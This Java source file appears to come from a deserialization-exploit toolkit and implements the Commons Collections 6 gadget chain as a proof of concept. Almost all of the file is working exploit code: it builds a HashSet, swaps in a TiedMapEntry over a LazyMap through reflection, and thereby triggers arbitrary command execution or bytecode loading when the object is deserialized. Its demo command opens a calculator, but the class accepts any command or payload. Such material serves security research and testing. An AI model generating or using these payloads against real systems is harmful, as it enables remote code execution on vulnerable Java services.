package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.map.LazyMap;
import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
    by @matthias_kaiser
*/
public class CC6 implements POC{

    public Object getPocObject(Transformer transformer) throws Exception{
        final Map innerMap = new HashMap();

        LazyMap map = (LazyMap) LazyMap.decorate(innerMap, transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map, TrAXFilter.class);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");


        HashMap hashset_map = (HashMap) ReflectUtils.getFieldValue(hashset,"map");
        Object[] array = (Object[]) ReflectUtils.getFieldValue(hashset_map,"table");

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedmap);

        return hashset;
    }


    @Override
    public Object getPocObject(byte[] bytes) throws Exception {
        return getPocObject(GCC.instantiateTransformer2RCE(bytes));
    }


    @Override
    public Object getPocObject(String cmd) throws Exception {
        return getPocObject(GCC.instantiateTransformer2RCE(cmd));
    }


    public static void main(String[] args) throws Exception {
        String cmd= "open /System/Applications/Calculator.app";
        Object poc = new CC6().getPocObject(cmd);
        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
    }
}
